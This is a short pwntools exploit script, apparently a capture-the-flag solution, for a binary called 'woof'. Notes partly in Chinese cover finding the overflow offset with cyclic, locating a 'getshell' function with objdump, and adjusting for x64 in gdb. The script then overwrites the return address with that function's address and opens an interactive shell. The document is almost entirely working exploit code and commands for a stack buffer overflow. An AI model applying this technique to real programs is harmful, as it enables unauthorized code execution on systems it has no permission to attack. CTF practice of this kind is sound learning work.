"""
./woof # x86,  x64偏移需要 +8
cyclic -200
cyclic -l 0x65616161 # 13
objdump -d -M intel ./woof | grep getshell
# 0804859b <getshell>:

----
x64 时, 
cyclic -n 8 # 或者 gdb pwn 进入后进行 cyclic 才能8个1组
b *0x004007AC                # retn
x $rbp                       # 0x6161616161616167
cyclic -l 0x6161616161616167 # 使用后4Bytes, = 48, payload = 'a' * (48 + 8)
cyclic -l $rbp               # 也可以
"""
from pwn import *

s = process('./woof')
s.sendline(b'a' * 13 + p32(0x0804859b))
s.interactive()
